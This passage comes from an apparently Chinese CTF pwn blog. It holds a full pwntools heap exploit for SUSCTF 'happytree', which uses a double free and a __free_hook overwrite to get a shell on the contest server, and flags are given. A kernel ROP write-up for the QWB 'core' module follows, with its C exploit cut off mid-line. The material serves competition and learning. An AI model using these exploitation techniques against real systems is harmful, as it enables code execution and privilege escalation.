class="number">0xf0</span>+<span class="number">18</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    config(payload)</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;ch&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br><span class="line"><span class="comment">#SUSCTF&#123;S0_Beautiful_Rain_adasda&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>首先远程很玄学，其次堆的地址的长度其实不是固定的，我的虚拟机上是6个字节，导致我以为远程也是6个字节，然后一直接收错误，麻了。</p>
<h2 id="happytree"><a href="#happytree" class="headerlink" title="happytree"></a>happytree</h2><p>感觉漏洞不是很容易察觉，就是在有一个子节点的节点被删除时指向子节点的地址不会被删除，也就是多个指针指向同一个堆块（大忌），利用这一点可以直接doublefree，但是doublefree也不是随便就能搞的，在操作中很容易造成树变成循环树了，在删除节点时直接报错。然后暴露libc地址的时候也是利用malloc申请bins上的节点时不会清除fd和bk，所以从unsorted上申请到的堆的bk上就有libc地址（也可以利用这一点得知heap地址，但对此题无益）,至于怎么填满tcache把堆放置到unsorted上，也是利用程序申请节点时的整数溢出。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/ld-2.27.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&#x27;&#125;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.27-3ubuntu1.2_amd64/libc-2.27.so&#x27;</span>)</span><br><span class="line">sh=remote(<span class="string">&#x27;124.71.147.225&#x27;</span>,<span class="number">9999</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_tree</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;cmd&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;data: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;content: &#x27;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_tree</span>(<span class="params">size</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;cmd&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;data: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_tree</span>(<span class="params">size</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;cmd&gt; &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;data: &#x27;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        add_tree(<span class="number">0xf0</span>+i*<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        del_tree(<span class="number">0xf0</span>+(<span class="number">7</span>-i)*<span class="number">0x100</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        add_tree(<span class="number">0xf0</span>+i*<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    show_tree(<span class="number">0xf0</span>+<span class="number">7</span>*<span class="number">0x100</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">    libc_base=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">&#x27;\x00&#x27;</span>))-libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x10</span>-<span class="number">96</span></span><br><span class="line">    free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">    add_tree(<span class="number">0xf0</span>+<span class="number">8</span>*<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add_tree(<span class="number">0xf0</span>+<span class="number">9</span>*<span class="number">0x100</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">    add_tree(<span class="number">0xa0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add_tree(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add_tree(<span class="number">0xc0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    del_tree(<span class="number">0xb0</span>)</span><br><span class="line">    add_tree(<span class="number">0x40</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    del_tree(<span class="number">0x40</span>)</span><br><span class="line">    add_tree(<span class="number">0xb0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    del_tree(<span class="number">0xc0</span>)</span><br><span class="line">    del_tree(<span class="number">0</span>)</span><br><span class="line">    add_tree(<span class="number">0x1c0</span>,p64(free_hook))</span><br><span class="line">    add_tree(<span class="number">0x2c0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    del_tree(<span class="number">0xf0</span>+<span class="number">8</span>*<span class="number">0x100</span>)</span><br><span class="line">    add_tree(<span class="number">0x3c0</span>,p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    del_tree(<span class="number">0xf0</span>+<span class="number">9</span>*<span class="number">0x100</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(sh)</span></span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br><span class="line"><span class="comment">#SUSCTF&#123;We_4re_pl4ying_unDer_th3_tRee&#125;</span></span><br></pre></td></tr></table></figure>




      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/02/11/kernelpwn%E7%AC%AC%E4%BA%8C%E9%81%93%E9%A2%98/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="我的博客">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/02/11/kernelpwn%E7%AC%AC%E4%BA%8C%E9%81%93%E9%A2%98/" class="post-title-link" itemprop="url">kernelpwn第二道题</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2022-02-11 21:52:11 / 修改时间：21:52:36" itemprop="dateCreated datePublished" datetime="2022-02-11T21:52:11+08:00">2022-02-11</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="kernelrop"><a href="#kernelrop" class="headerlink" title="kernelrop"></a>kernelrop</h1><p>不知道为啥今天忽然很累（可能是昨晚没睡好？），不怎么想学习，但想起来自己的kernelpwn才入门两天，不能在这个时候颓废，还是撸起袖子加油干吧。</p>
<p>今天看kernelpwn的第二道题</p>
<p>找题找了一会，忽然翻到了一个大佬的博客，是需要仰望的那种，很厉害啊。</p>
<h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><h3 id="脚本分析"><a href="#脚本分析" class="headerlink" title="脚本分析"></a>脚本分析</h3><p>启动脚本</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">rootzhang@rootzhang-virtual-machine:~/kernelstudy/pwn2/give_to_player$ cat ./start.sh</span><br><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>-append选项是启动时的附加选项，’quiet kaslr’代表启动kaslr，其他的我也看不懂😴</p>
<p>文件系统的init</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2 </span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp;</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br></pre></td></tr></table></figure>

<p>有几行不能理解做了做下记录</p>
<p><strong>/proc/kallsyms</strong>:开发者为了方便调试内核代码，将内核中的所有函数和非栈变量的地址抽取出来，形成一个符号表（符号对应地址），kallsyms就能查看这个符号表，<code>cat /proc/kallsyms &gt; /tmp/kallsyms</code>就是把/proc/kallsyms保存到tmp/kallsyms中去.</p>
<p><strong>ktr_restrict&amp;dmesg_restrict</strong>:这个文件控制是否可以打印内核地址，当他等于0的时候是可以直接通过kallsyms直接打印地址，当等于1的时候就不能能直接打印了。dmesg_restrict文件能够控制dmesg命令能否直接打印内核缓存区的值，当他为1的时候dmesg就不能直接打印。两个命令的组合拳导致无法直接/proc/kallsyms查看内核地址，但是没有禁止/tmp/kallsyms。</p>
<p><strong>poweroff -d 120 -f &amp;</strong>:这是定时关机的命令，直接注释掉</p>
<p>通过init文件的查看可以锁定core.ko,通过checksec查看保护</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] &#x27;/home/rootzhang/kernelstudy/pwn2/give_to_player/rootfs/core.cpio/core.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>

<p>对昨天关于内核保护和用户态保护有个初步的猜想，.ko文件估计两个保护都有，可见有canary保护和nx.</p>
<h4 id="ko文件分析"><a href="#ko文件分析" class="headerlink" title=".ko文件分析"></a>.ko文件分析</h4><p><strong>init_module</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">init_module</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  core_proc = proc_create(<span class="string">&quot;core&quot;</span>, <span class="number">438LL</span>, <span class="number">0LL</span>, &amp;core_fops);</span><br><span class="line">  printk(&amp;unk_2DE);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数是模块被加载到内核的执行的，proc_create函数的作用是在proc文件夹在产生一个虚拟的文件core,用户态就可以利用这个文件和模块通信了。</p>
<p><strong>core_ioctl</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">core_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2, __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">switch</span> ( a2 )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109787</span>:</span><br><span class="line">      core_read(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109788</span>:</span><br><span class="line">      printk(&amp;unk_2CD);</span><br><span class="line">      off = a3;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">1719109786</span>:</span><br><span class="line">      printk(&amp;unk_2B3);</span><br><span class="line">      core_copy_func(a3);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>设置了三条命令，分别是core_read()，设置全局变量off(我的判断：不是栈空间的变量就是全局变量)，和core_copy_func().</p>
<p><strong>core_read</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> __int64 __fastcall <span class="title">core_read</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *v2; <span class="comment">// rdi</span></span><br><span class="line">  __int64 i; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> v5[<span class="number">64</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v6; <span class="comment">// [rsp+40h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_25B);</span><br><span class="line">  printk(&amp;unk_275);</span><br><span class="line">  v2 = v5;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">16LL</span>; i; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    *(_DWORD *)v2 = <span class="number">0</span>;</span><br><span class="line">    v2 += <span class="number">4</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">strcpy</span>(v5, <span class="string">&quot;Welcome to the QWB CTF challenge.\n&quot;</span>);</span><br><span class="line">  result = copy_to_user(a1, &amp;v5[off], <span class="number">64LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !result )</span><br><span class="line">    <span class="keyword">return</span> __readgsqword(<span class="number">0x28</span>u) ^ v6;</span><br><span class="line">  __asm &#123; swapgs &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把从&amp;v5[off]开始拷贝64个字节到用户态。off我们可控，那就代表着泄露敏感信息。<code>__asm &#123; swapgs &#125;</code>这个是切换用户态和内核态的指令。</p>
<p><strong>core_copy_func</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">core_copy_func</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  _QWORD v2[<span class="number">10</span>]; <span class="comment">// [rsp+0h] [rbp-50h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v2[<span class="number">8</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  printk(&amp;unk_215);</span><br><span class="line">  <span class="keyword">if</span> ( a1 &gt; <span class="number">63</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(&amp;unk_2A1);</span><br><span class="line">    result = <span class="number">0xFFFFFFFF</span>LL;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0LL</span>;</span><br><span class="line">    qmemcpy(v2, &amp;name, (<span class="keyword">unsigned</span> __int16)a1);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>把全局变量name拷贝a1个字节到v2,a1可以整数溢出，所以可以栈溢出了。</p>
<p><strong>core_write</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">signed</span> __int64 __fastcall <span class="title">core_write</span><span class="params">(__int64 a1, __int64 a2, <span class="keyword">unsigned</span> __int64 a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v3; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  v3 = a3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: called core_writen&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( v3 &lt;= <span class="number">0x800</span> &amp;&amp; !copy_from_user(name, a2, v3) )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">unsigned</span> <span class="keyword">int</span>)v3;</span><br><span class="line">  printk(<span class="string">&quot;\x016core: error copying data from userspacen&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0xFFFFFFF2</span>LL;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以向name copy很多的字节</p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>思路：先设置off的值，然后通过core_read()函数leak出canary，然后通过core_write函数向name写rop,然后通过coe_copy_func函数把rop给copy到栈上执行rop。</p>
<p>这是我的大致思路（完全借鉴），至于rop怎么构造怎么提权，怎么返回用户态执行system(‘/bin/sh’)函数都还大致不清楚，等我慢慢钻研。</p>
<p>这是我复刻的脚本，和wiki上的查重率应该能超过百分之70，但好在是自己一个一个字符敲的，在写（抄）的过程中也知道很理解了很多东西，也不得不感叹c语言的强大（指针和内存控制）。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> commit_creds=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> raw_vmlinux_base=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base=<span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">find_symbols</span><span class="params">()</span></span>&#123;</span><br><span class="line">    FILE* kallsyms_fd=fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>,<span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(kallsyms_fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]opne kallsyms error&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x30</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">while</span> (fgets(buf,<span class="number">0x30</span>,kallsyms_fd))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(commit_creds&amp;prepare_kernel_cred)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strstr</span>(buf,<span class="string">&quot;commit_creds&quot;</span>)&amp;&amp;!commit_creds)&#123;</span><br><span class="line">            <span class="keyword">char</span> hex[<span class="number">20</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">            <span class="built_in">strncpy</span>(hex,buf,<span class="number">16</span>);</span><br><span class="line">            <span class="built_in">sscanf</span>(hex,<span class="string">&quot;%llx&quot;</span>,&amp;commit_creds);</span><br><span class="line">            <span class="built_in">printf</span>(<span 